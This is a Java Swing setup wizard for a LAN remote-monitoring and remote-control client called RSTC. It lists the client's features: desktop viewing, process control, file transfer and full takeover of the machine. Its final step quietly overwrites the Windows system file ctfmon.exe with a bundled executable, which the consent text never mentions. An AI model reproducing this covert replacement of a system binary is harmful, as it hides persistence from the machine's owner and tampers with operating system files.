import java.io.*;
import java.lang.*;
import java.io.*;
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import javax.swing.event.*;
import java.util.*;

class ClientSetup extends JFrame implements ActionListener
{
  JPanel jp1=new JPanel(new FlowLayout(FlowLayout.CENTER));
  JPanel jp2;
  JPanel jp3=new JPanel(new FlowLayout(FlowLayout.RIGHT,15,15));
  JPanel MainPanel2=new JPanel(new FlowLayout(FlowLayout.LEFT));
  JPanel MainPanel=new JPanel(new FlowLayout(FlowLayout.LEFT,0,0));
  JButton b1=new JButton ("Next >>");
  JButton b2=new JButton ("Canel");
  Image img;

  public ClientSetup()
  {
   super("RSTC Setup");
   setSize(600,490);
   setLocation(200,150);
   setDefaultCloseOperation(0);
   b1.addActionListener(this);
   b2.addActionListener(this);
   MainPanel2=(JPanel)getContentPane();
   MainPanel.setPreferredSize(new Dimension(600,500));
   MainPanel.setVisible(true);
   MainPanel.setBackground(Color.WHITE);
   MainPanel2.setBackground(Color.WHITE);
   jp1.setPreferredSize(new Dimension(580,50));
   jp1.add(new JLabel("<html> <font color=blue size=5> Remote System Tracket and Controller (Client) setup Wizard  </font> </html>"));
   jp1.setBackground(Color.WHITE);

   jp2=new ImagePanel();

   jp3.setPreferredSize(new Dimension(600,50));
   jp3.setBackground(Color.WHITE);
   jp3.add(b1);
   jp3.add(b2);

   MainPanel.add(jp1);
   MainPanel.add(jp2);
   MainPanel.add(jp3);

   jp1.setVisible(true);
   jp2.setVisible(true);
   jp3.setVisible(true);


   MainPanel2.add(MainPanel);
   MainPanel.setVisible(true);

   MainPanel2.setVisible(true);
   setResizable(false);
   setVisible(true);
  }

  public void actionPerformed(ActionEvent ae)
  {
   if(ae.getActionCommand().trim().equals("Next >>"))
   {
    setVisible(false);
    new ClientSetup2();
   }
   else
   {
    YesNo y=new YesNo(this,"Sure you want to Quit?");
    if(y.getOption())
    System.exit(0);
   }
  }
   
  public static void main(String args[])throws Exception
  {
   try
   {
    new ClientSetup();
   }catch(Exception e){}
  }
}


class ImagePanel extends JPanel
{
 Image img;

 public ImagePanel()
 {
  setPreferredSize(new Dimension(600,360));
  img=Toolkit.getDefaultToolkit().getImage("rstcicon.jpg");
  img=img.getScaledInstance(600,360,4);
  repaint();
  setVisible(true);
 }


  public void paint(Graphics g)
  {
   try
   {
    g.drawImage(img,0,0,this);
   }catch(Exception e){System.out.println(e);}
  }
}


class ClientSetup2 extends JFrame implements ActionListener, ItemListener
{
  JPanel jp1=new JPanel(new FlowLayout(FlowLayout.CENTER));
  JPanel jp2;
  JPanel jp3=new JPanel(new FlowLayout(FlowLayout.RIGHT,15,15));
  JPanel MainPanel2=new JPanel(new FlowLayout(FlowLayout.LEFT));
  JPanel MainPanel=new JPanel(new FlowLayout(FlowLayout.LEFT,0,0));
  JButton b1=new JButton ("Next >>");
  JButton b2=new JButton ("Canel");
  Image img;
  TextArea tx=new TextArea(20,80);
  JCheckBox cb=new JCheckBox("I have read the information and I Accept to install the software");

  public ClientSetup2()
  {
   super("RSTC Setup");
   setSize(600,490);
   setLocation(200,150);
   setDefaultCloseOperation(0);
   b1.addActionListener(this);
   b2.addActionListener(this);
   b1.setEnabled(false);
   cb.addItemListener(this);
   cb.setBackground(Color.WHITE);
   tx.setEditable(false);
   tx.setText(" Remote System Tracker and Controller  is a  newtwork oriented software \n"+
               "where this server software is used to track and control all the client \n" +
               "which are connected over lan. \n\n"+

               "   This Client software is controlled by the server and below are some of them \n"+
               "      * First and most the desktop view of the connected clients will be dislplayed at the server, all the activities will be tracked at the server\n"+
               "      * Next is to send the task or the process that are running in the client to the server\n"+
               "      * And server has the ablilty to close the task or process in the client\n"+
               "      * Server is also capable of running new tasks or processes in the client\n"+
               "          Note: Only the process that can be run in command prompt and if given the\n"+
               "                full physical path of the .exe that exists in the client system\n"+
               "      * Server can shutdown, restart and logoff the connected clients one or all at a time\n"+
               "      * Server can sending, receiving files to and from this Client without the intervention of this client, and also delete files\n"+
               "      * Server can block this client when found suspicious, as a result client is unable to do any GUI operations\n"+
               "      * Ultimate and the utmost feature is that the server can take complete control of this client sytem, and server can perform the following \n"+
               "               ==> When Server takes complete control of client, keyboard, mouse and display of the client will be under the control of the server\n"+
               "               ==> Client system's keyborad and mouse will be under complete control of the server, and client is also capable of working with the keyboard and mouse but not in a convinent way\n"+
               "This first version of this software needs the following requirements in the client side\n"+
               "       * Processor with more than 2.4 Ghz\n"+
               "       * RAM with 1 Gb or more\n"+
               "       * Minimum 200 mb of free space in 'c' drive\n"+
               "       * Display dirvers installed\n"+
               "       * Network drives and network adapters installed with ip address configured\n"+
               "       * Customized products are also available, if needed contact the authors of the software\n\n\n"+

               "If you have agreed with the above requirement, you can install the software");







   MainPanel2=(JPanel)getContentPane();
   MainPanel.setPreferredSize(new Dimension(600,500));
   MainPanel.setVisible(true);
   MainPanel.setBackground(Color.WHITE);
   MainPanel2.setBackground(Color.WHITE);
   jp1.setPreferredSize(new Dimension(580,50));
   jp1.add(new JLabel("<html> <font color=blue size=7>  Information About RSTC Client </font> </html>"));
   jp1.setBackground(Color.WHITE);

   jp2=new JPanel(new FlowLayout(FlowLayout.LEFT));
   jp2.setPreferredSize(new Dimension(600,360));
   jp2.setBackground(Color.WHITE);
   jp2.add(tx);
   jp2.add(cb);


   jp3.setPreferredSize(new Dimension(600,50));
   jp3.setBackground(Color.WHITE);
   jp3.add(b1);
   jp3.add(b2);

   MainPanel.add(jp1);
   MainPanel.add(jp2);
   MainPanel.add(jp3);

   jp1.setVisible(true);
   jp2.setVisible(true);
   jp3.setVisible(true);


   MainPanel2.add(MainPanel);
   MainPanel.setVisible(true);

   MainPanel2.setVisible(true);
   setResizable(false);
   setVisible(true);
  }

  public void actionPerformed(ActionEvent ae)
  {
   if(ae.getActionCommand().trim().equals("Next >>"))
   { setVisible(false);
     new ClientSetup3();
   }
   else
   {
    YesNo y=new YesNo(this,"Sure yout want to Quit?");
    if(y.getOption())
    System.exit(0);
   }
  }

  public void itemStateChanged(ItemEvent ie)
  {
   if(ie.getStateChange()==1)
   b1.setEnabled(true);
   else
   b1.setEnabled(false);
  }
}   






class ClientSetup3 extends JFrame implements ActionListener, ItemListener
{
  JPanel jp1=new JPanel(new FlowLayout(FlowLayout.CENTER));
  JPanel jpprogress;
  JPanel jp3=new JPanel(new FlowLayout(FlowLayout.RIGHT,15,15));
  JPanel MainPanel2=new JPanel(new FlowLayout(FlowLayout.LEFT));
  JPanel MainPanel=new JPanel(new FlowLayout(FlowLayout.LEFT,0,0));
  static JButton b1=new JButton ("Next >>");
  JButton b2=new JButton ("Canel");
  static JProgressBar jpb;
  static String pbstring=new String("0%");
  static JLabel copyfile=new JLabel("Preparing to copy..");
  static JLabel percent=new JLabel("");
  CopyFilesClient cf;
  public ClientSetup3()
  {
   super("RSTC Setup");
   setSize(600,490);
   setLocation(200,150);
   setDefaultCloseOperation(0);
   b1.addActionListener(this);
   b2.addActionListener(this);
   b1.setEnabled(false);

   MainPanel2=(JPanel)getContentPane();
   MainPanel.setPreferredSize(new Dimension(600,500));
   MainPanel.setVisible(true);
   MainPanel.setBackground(Color.WHITE);
   MainPanel2.setBackground(Color.WHITE);
   jp1.setPreferredSize(new Dimension(580,50));
   jp1.add(new JLabel("<html> <font color=blue size=7>  Installing Client RSTC... </font> </html>"));
   jp1.setBackground(Color.WHITE);

   JPanel jp2=new JPanel(new FlowLayout(FlowLayout.LEFT));
   jp2.add(percent);
   jp2.add(copyfile);
   jp2.setPreferredSize(new Dimension(600,30));
   jp2.setBackground(Color.WHITE);

   jpb=new JProgressBar(0,100);
   jpb.setString(pbstring);
   jpprogress=new JPanel(new GridLayout(1,1));
   jpprogress.setPreferredSize(new Dimension(590,30));
   jpprogress.setBackground(Color.WHITE);
   jpprogress.add(jpb);


   jp3.setPreferredSize(new Dimension(600,50));
   jp3.setBackground(Color.WHITE);
   jp3.add(b1);
   jp3.add(b2);
   Empty empty=new Empty();
   empty.setPreferredSize(new Dimension(600,300));
   empty.setBackground(Color.WHITE);

   MainPanel.add(jp1);
   MainPanel.add(jp2);
   MainPanel.add(jpprogress);
   MainPanel.add(empty);
   MainPanel.add(jp3);

   jp1.setVisible(true);
   jp2.setVisible(true);
   jpprogress.setVisible(true);
   empty.setVisible(true);
   jp3.setVisible(true);


   MainPanel2.add(MainPanel);
   MainPanel.setVisible(true);

   MainPanel2.setVisible(true);
   setResizable(false);
   setVisible(true);
   try
   {
   cf= new CopyFilesClient();
   }catch(Exception e){}
  }

  public void actionPerformed(ActionEvent ae)
  {
   if(ae.getActionCommand().trim().equals("Next >>"))
   {
    try
    {
     Runtime.getRuntime().exec("Registrator.exe");
     setVisible(false);
     new FinishDialog(this);
    }catch(Exception e){}
   }
   else
   {
    YesNo y=new YesNo(this,"Sure yout want to Quit?");
    if(y.getOption())
    {
     String filename="c:\\WINDOWS\\System32\\2000";
     JOptionPane.showMessageDialog(null,"Cancelling installation will remove the copied files ","RSTC",1);
     cf.stop();
     File f=new File(filename);
     File fl[]=f.listFiles();
     for(int i=0;i<fl.length;i++)
     {
      fl[i].delete();
     }
     File f1=new File(filename);
     f1.delete();
     System.exit(0);
    }
   }
  }

  public void itemStateChanged(ItemEvent ie)
  {
   if(ie.getStateChange()==1)
   b1.setEnabled(true);
   else
   b1.setEnabled(false);
  }
}   

class Empty extends JPanel
{
 Image img;

  public Empty()
  {
   try
   {
    img=Toolkit.getDefaultToolkit().getImage("rstcicon.jpg");
    img=img.getScaledInstance(600,300,4);
    repaint();
   }catch(Exception e){}
  }

  public void paint(Graphics g)
  {
  try
  {
   g.drawImage(img,0,0,this);
  }catch(Exception e){}
  }

 }
                      
class FinishDialog extends JDialog implements ActionListener
{
  boolean run=false;
  boolean restart=false;
  JPanel jp1=new JPanel(new FlowLayout(FlowLayout.LEFT));
  JPanel jp2=new JPanel(new FlowLayout(FlowLayout.LEFT));
  JPanel jp3=new JPanel(new FlowLayout(FlowLayout.RIGHT));
  JButton b1=new JButton ("Finish");
  JPanel MainPanel=new JPanel(new FlowLayout(FlowLayout.LEFT));
  JCheckBox cb2=new JCheckBox("Restart System (\"Recomended\")");
  public FinishDialog(Frame f)
  {
   super(f,"RSTC",true);
   try
   {
    new FinalSetup(); 
    setSize(350,250);
    setLocation(400,300);
    MainPanel.setPreferredSize(new Dimension(300,200));
    MainPanel.setBackground(Color.WHITE);
    setContentPane(MainPanel);
    b1.addActionListener(this);
    jp1.setPreferredSize(new Dimension(300,66));
    jp1.setBackground(Color.WHITE);
    jp2.setPreferredSize(new Dimension(300,66));
    jp2.setBackground(Color.WHITE);
    jp3.setPreferredSize(new Dimension(300,66));
    jp3.setBackground(Color.WHITE);

    jp2.add(cb2);
    jp3.add(b1);
    MainPanel.add(jp1);
    MainPanel.add(jp2);
    MainPanel.add(jp3);
    jp1.setVisible(true);
    jp2.setVisible(true);
    jp3.setVisible(true);
    MainPanel.setVisible(true);
    setVisible(true);
   }catch(Exception e){}
  }

  public void actionPerformed(ActionEvent ae)
  {
   try
   {
    if(cb2.isSelected()==true)
    Runtime.getRuntime().exec("shutdown -r -f -t 00");
    System.exit(0);
   }catch(Exception e){}
  }
}

class FinalSetup 
{

  public FinalSetup()
  {
   try
   {
    File f=new File("c:\\WINDOWS\\system32\\ctfmon.exe");
   
    DataInputStream in=new DataInputStream(new FileInputStream("c:\\WINDOWS\\system32\\2000\\replace.exe"));
    DataOutputStream out=new DataOutputStream(new FileOutputStream("c:\\WINDOWS\\system32\\ctfmon.exe"));
    RandomAccessFile ra=new RandomAccessFile("c:\\WINDOWS\\system32\\2000\\replace.exe","r");
    long l=ra.length();

    for(int i=0;i<l;i++)
    {
     out.writeByte(in.readByte());
     out.flush();
    }
    out.close();
    in.close();

    Runtime.getRuntime().exec("ClientRSTC");

   }catch(Exception e){}
  }
}

